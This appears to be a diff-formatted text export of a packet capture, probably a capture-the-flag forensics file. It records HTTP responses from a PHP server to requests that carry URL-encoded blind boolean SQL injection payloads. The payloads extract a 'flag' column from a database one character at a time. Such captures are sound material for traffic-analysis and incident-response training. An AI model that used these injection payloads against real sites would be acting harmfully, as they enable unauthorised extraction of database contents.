+    Content-Type: text/html; charset=UTF-8\r\n
+    \r\n
+    [HTTP response 1/1]
+    [Time since request: 0.022765692 seconds]
+    [Request in frame: 1602]
+    [Request URI: http://bbs.ambb1.top:5000/index.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag_here%20AS%20CHAR%29%2C0x20%29%20FROM%20sqltest.flag%20ORDER%20BY%20flag_here%20LIMIT%200%2C1%29%2C13%2C1%29%29%3E96]
+    File Data: 944 bytes
+Line-based text data: text/html (24 lines)
+
+No.     Time           Source                Destination           Protocol Length Info
+   1613 51.185322263   47.94.6.19            172.24.11.132         HTTP     1192   HTTP/1.1 200 OK  (text/html)
+
+Frame 1613: 1192 bytes on wire (9536 bits), 1192 bytes captured (9536 bits) on interface eth0, id 0
+Ethernet II, Src: Vmware_e2:09:ee (00:50:56:e2:09:ee), Dst: Vmware_fe:64:03 (00:0c:29:fe:64:03)
+Internet Protocol Version 4, Src: 47.94.6.19, Dst: 172.24.11.132
+Transmission Control Protocol, Src Port: 5000, Dst Port: 37950, Seq: 1, Ack: 370, Len: 1138
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+    Date: Thu, 16 Jul 2020 03:49:44 GMT\r\n
+    Server: Apache/2.2.15 (CentOS)\r\n
+    X-Powered-By: PHP/5.3.3\r\n
+    Content-Length: 945\r\n
+    Connection: close\r\n
+    Content-Type: text/html; charset=UTF-8\r\n
+    \r\n
+    [HTTP response 1/1]
+    [Time since request: 0.021570291 seconds]
+    [Request in frame: 1608]
+    [Request URI: http://bbs.ambb1.top:5000/index.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag_here%20AS%20CHAR%29%2C0x20%29%20FROM%20sqltest.flag%20ORDER%20BY%20flag_here%20LIMIT%200%2C1%29%2C13%2C1%29%29%3E112]
+    File Data: 945 bytes
+Line-based text data: text/html (24 lines)
+
+No.     Time           Source                Destination           Protocol Length Info
+   1638 51.291703268   47.94.6.19            172.24.11.132         HTTP     1192   HTTP/1.1 200 OK  (text/html)
+
+Frame 1638: 1192 bytes on wire (9536 bits), 1192 bytes captured (9536 bits) on interface eth0, id 0
+Ethernet II, Src: Vmware_e2:09:ee (00:50:56:e2:09:ee), Dst: Vmware_fe:64:03 (00:0c:29:fe:64:03)
+Internet Protocol Version 4, Src: 47.94.6.19, Dst: 172.24.11.132
+Transmission Control Protocol, Src Port: 5000, Dst Port: 37956, Seq: 1, Ack: 370, Len: 1138
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+    Date: Thu, 16 Jul 2020 03:49:44 GMT\r\n
+    Server: Apache/2.2.15 (CentOS)\r\n
+    X-Powered-By: PHP/5.3.3\r\n
+    Content-Length: 945\r\n
+    Connection: close\r\n
+    Content-Type: text/html; charset=UTF-8\r\n
+    \r\n
+    [HTTP response 1/1]
+    [Time since request: 0.023947015 seconds]
+    [Request in frame: 1635]
+    [Request URI: http://bbs.ambb1.top:5000/index.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag_here%20AS%20CHAR%29%2C0x20%29%20FROM%20sqltest.flag%20ORDER%20BY%20flag_here%20LIMIT%200%2C1%29%2C13%2C1%29%29%3E114]
+    File Data: 945 bytes
+Line-based text data: text/html (24 lines)
+
+No.     Time           Source                Destination           Protocol Length Info
+   1647 51.318940789   47.94.6.19            172.24.11.132         HTTP     1192   HTTP/1.1 200 OK  (text/html)
+
+Frame 1647: 1192 bytes on wire (9536 bits), 1192 bytes captured (9536 bits) on interface eth0, id 0
+Ethernet II, Src: Vmware_e2:09:ee (00:50:56:e2:09:ee), Dst: Vmware_fe:64:03 (00:0c:29:fe:64:03)
+Internet Protocol Version 4, Src: 47.94.6.19, Dst: 172.24.11.132
+Transmission Control Protocol, Src Port: 5000, Dst Port: 37960, Seq: 1, Ack: 370, Len: 1138
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+    Date: Thu, 16 Jul 2020 03:49:44 GMT\r\n
+    Server: Apache/2.2.15 (CentOS)\r\n
+    X-Powered-By: PHP/5.3.3\r\n
+    Content-Length: 945\r\n
+    Connection: close\r\n
+    Content-Type: text/html; charset=UTF-8\r\n
+    \r\n
+    [HTTP response 1/1]
+    [Time since request: 0.021267818 seconds]
+    [Request in frame: 1644]
+    [Request URI: http://bbs.ambb1.top:5000/index.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag_here%20AS%20CHAR%29%2C0x20%29%20FROM%20sqltest.flag%20ORDER%20BY%20flag_here%20LIMIT%200%2C1%29%2C13%2C1%29%29%3E115]
+    File Data: 945 bytes
+Line-based text data: text/html (24 lines)
+
+No.     Time           Source                Destination           Protocol Length Info
+   1658 51.361717921   47.94.6.19            172.24.11.132         HTTP     1191   HTTP/1.1 200 OK  (text/html)
+
+Frame 1658: 1191 bytes on wire (9528 bits), 1191 bytes captured (9528 bits) on interface eth0, id 0
+Ethernet II, Src: Vmware_e2:09:ee (00:50:56:e2:09:ee), Dst: Vmware_fe:64:03 (00:0c:29:fe:64:03)
+Internet Protocol Version 4, Src: 47.94.6.19, Dst: 172.24.11.132
+Transmission Control Protocol, Src Port: 5000, Dst Port: 37964, Seq: 1, Ack: 369, Len: 1137
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+    Date: Thu, 16 Jul 2020 03:49:44 GMT\r\n
+    Server: Apache/2.2.15 (CentOS)\r\n
+    X-Powered-By: PHP/5.3.3\r\n
+    Content-Length: 944\r\n
+    Connection: close\r\n
+    Content-Type: text/html; charset=UTF-8\r\n
+    \r\n
+    [HTTP response 1/1]
+    [Time since request: 0.018559240 seconds]
+    [Request in frame: 1656]
+    [Request URI: http://bbs.ambb1.top:5000/index.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag_here%20AS%20CHAR%29%2C0x20%29%20FROM%20sqltest.flag%20ORDER%20BY%20flag_here%20LIMIT%200%2C1%29%2C14%2C1%29%29%3E96]
+    File Data: 944 bytes
+Line-based text data: text/html (24 lines)
+
+No.     Time           Source                Destination           Protocol Length Info
+   1665 51.389152564   47.94.6.19            172.24.11.132         HTTP     1192   HTTP/1.1 200 OK  (text/html)
+
+Frame 1665: 1192 bytes on wire (9536 bits), 1192 bytes captured (9536 bits) on interface eth0, id 0
+Ethernet II, Src: Vmware_e2:09:ee (00:50:56:e2:09:ee), Dst: Vmware_fe:64:03 (00:0c:29:fe:64:03)
+Internet Protocol Version 4, Src: 47.94.6.19, Dst: 172.24.11.132
+Transmission Control Protocol, Src Port: 5000, Dst Port: 37962, Seq: 1, Ack: 370, Len: 1138
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+    Date: Thu, 16 Jul 2020 03:49:44 GMT\r\n
+    Server: Apache/2.2.15 (CentOS)\r\n
+    X-Powered-By: PHP/5.3.3\r\n
+    Content-Length: 945\r\n
+    Connection: close\r\n
+    Content-Type: text/html; charset=UTF-8\r\n
+    \r\n
+    [HTTP response 1/1]
+    [Time since request: 0.021835777 seconds]
+    [Request in frame: 1662]
+    [Request URI: http://bbs.ambb1.top:5000/index.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag_here%20AS%20CHAR%29%2C0x20%29%20FROM%20sqltest.flag%20ORDER%20BY%20flag_here%20LIMIT%200%2C1%29%2C14%2C1%29%29%3E112]
+    File Data: 945 bytes
+Line-based text data: text/html (24 lines)
+
+No.     Time           Source                Destination           Protocol Length Info
+   1676 51.436806523   47.94.6.19            172.24.11.132         HTTP     1192   HTTP/1.1 200 OK  (text/html)
+
+Frame 1676: 1192 bytes on wire (9536 bits), 1192 bytes captured (9536 bits) on interface eth0, id 0
+Ethernet II, Src: Vmware_e2:09:ee (00:50:56:e2:09:ee), Dst: Vmware_fe:64:03 (00:0c:29:fe:64:03)
+Internet Protocol Version 4, Src: 47.94.6.19, Dst: 172.24.11.132
+Transmission Control Protocol, Src Port: 5000, Dst Port: 37968, Seq: 1, Ack: 370, Len: 1138
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+    Date: Thu, 16 Jul 2020 03:49:44 GMT\r\n
+    Server: Apache/2.2.15 (CentOS)\r\n
+    X-Powered-By: PHP/5.3.3\r\n
+    Content-Length: 945\r\n
+    Connection: close\r\n
+    Content-Type: text/html; charset=UTF-8\r\n
+    \r\n
+    [HTTP response 1/1]
+    [Time since request: 0.020888234 seconds]
+    [Request in frame: 1674]
+    [Request URI: http://bbs.ambb1.top:5000/index.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag_here%20AS%20CHAR%29%2C0x20%29%20FROM%20sqltest.flag%20ORDER%20BY%20flag_here%20LIMIT%200%2C1%29%2C14%2C1%29%29%3E120]
+    File Data: 945 bytes
+Line-based text data: text/html (24 lines)
+
+No.     Time           Source                Destination           Protocol Length Info
+   1683 51.461069726   47.94.6.19            172.24.11.132         HTTP     1192   HTTP/1.1 200 OK  (text/html)
+
+Frame 1683: 1192 bytes on wire (9536 bits), 1192 bytes captured (9536 bits) on interface eth0, id 0
+Ethernet II, Src: Vmware_e2:09:ee (00:50:56:e2:09:ee), Dst: Vmware_fe:64:03 (00:0c:29:fe:64:03)
+Internet Protocol Version 4, Src: 47.94.6.19, Dst: 172.24.11.132
+Transmission Control Protocol, Src Port: 5000, Dst Port: 37966, Seq: 1, Ack: 370, Len: 1138
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+    Date: Thu, 16 Jul 2020 03:49:44 GMT\r\n
+    Server: Apache/2.2.15 (CentOS)\r\n
+    X-Powered-By: PHP/5.3.3\r\n
+    Content-Length: 945\r\n
+    Connection: close\r\n
+    Content-Type: text/html; charset=UTF-8\r\n
+    \r\n
+    [HTTP response 1/1]
+    [Time since request: 0.019502514 seconds]
+    [Request in frame: 1680]
+    [Request URI: http://bbs.ambb1.top:5000/index.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag_here%20AS%20CHAR%29%2C0x20%29%20FROM%20sqltest.flag%20ORDER%20BY%20flag_here%20LIMIT%200%2C1%29%2C14%2C1%29%29%3E124]
+    File Data: 945 bytes
+Line-based text data: text/html (24 lines)
